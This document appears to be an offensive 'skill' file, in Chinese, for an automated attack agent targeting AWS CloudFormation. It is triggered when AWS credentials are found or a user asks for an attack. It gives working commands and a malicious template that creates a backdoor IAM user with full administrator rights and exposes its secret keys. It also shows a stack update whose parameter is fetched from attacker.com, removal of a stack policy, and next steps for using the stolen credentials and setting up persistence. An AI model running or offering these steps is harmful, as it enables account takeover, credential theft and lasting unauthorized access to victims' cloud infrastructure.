---
name: aws-cloudformation-attack
type: attack
category: infrastructure-as-code
platform: aws
severity: high
---

# AWS CloudFormation 攻击技能

## 触发条件

- 有 AWS 凭证且发现 CloudFormation 权限
- 发现 cloudformation:* 权限
- 用户要求"攻击 CloudFormation"

## 前置检查

```bash
# 1. 列出所有堆栈
aws cloudformation describe-stacks --query 'Stacks[].{Name:StackName,Status:StackStatus}'

# 2. 检查权限
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query 'Arn' --output text) \
  --action-names cloudformation:CreateStack,cloudformation:UpdateStack
```

## 攻击方法

### 方法 1: 模板注入

```bash
# 1. 列出堆栈
aws cloudformation describe-stacks

# 2. 获取堆栈模板
aws cloudformation get-template --stack-name STACK_NAME

# 3. 创建恶意堆栈
cat > malicious-template.yaml <<'EOF'
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  BackdoorUser:
    Type: AWS::IAM::User
    Properties:
      UserName: cloudformation-backdoor
  BackdoorKey:
    Type: AWS::IAM::AccessKey
    Properties:
      UserName: !Ref BackdoorUser
  BackdoorPolicy:
    Type: AWS::IAM::Policy
    Properties:
      PolicyName: BackdoorAdminPolicy
      Users:
        - !Ref BackdoorUser
      PolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Action: '*'
            Resource: '*'
Outputs:
  AccessKeyId:
    Value: !Ref BackdoorKey
  SecretAccessKey:
    Value: !GetAtt BackdoorKey.SecretAccessKey
EOF

# 4. 部署恶意堆栈
aws cloudformation create-stack \
  --stack-name backdoor-stack \
  --template-body file://malicious-template.yaml \
  --capabilities CAPABILITY_NAMED_IAM

# 5. 获取输出（凭证）
aws cloudformation describe-stacks \
  --stack-name backdoor-stack \
  --query 'Stacks[0].Outputs'
```

### 方法 2: 堆栈更新劫持

```bash
# 1. 更新现有堆栈
aws cloudformation update-stack \
  --stack-name target-stack \
  --use-previous-template \
  --parameters ParameterKey=backdoor,ParameterValue=$(curl https://attacker.com/payload)

# 2. 或注入新资源
aws cloudformation update-stack \
  --stack-name target-stack \
  --template-body file://malicious-addition.yaml
```

### 方法 3: 堆栈策略绕过

```bash
# 1. 列出堆栈策略
aws cloudformation describe-stack-policy --stack-name STACK_NAME

# 2. 如果阻止删除，修改策略
aws cloudformation set-stack-policy \
  --stack-name STACK_NAME \
  --policy-file file://empty-policy.json
```

### 方法 4: 资源标签后门

```bash
# 1. 通过标签追踪资源
aws cloudformation create-stack \
  --stack-name tracked-stack \
  --tags Key=Backdoor,Value=Active

# 2. 列出所有带特定标签的堆栈
aws cloudformation describe-stacks \
  --query 'Stacks[?contains(Tags[?Key==`Backdoor`].Value==`Active`)].StackName'
```

### 方法 5: 嵌套堆栈攻击

```bash
# 1. 检查嵌套堆栈
aws cloudformation describe-stack-resource --stack-name STACK_NAME --logical-resource-id NestedStack

# 2. 攻击父堆栈影响子堆栈
```

## 验证成功

```bash
# 成功创建堆栈
aws cloudformation describe-stacks --stack-name backdoor-stack

# 获取到凭证
aws cloudformation describe-stacks --stack-name backdoor-stack --query 'Stacks[0].Outputs'
```

## 下一步

1. 使用窃取的凭证访问其他资源
2. 通过 CloudFormation 持久化
3. aws-persistence - 建立更多后门
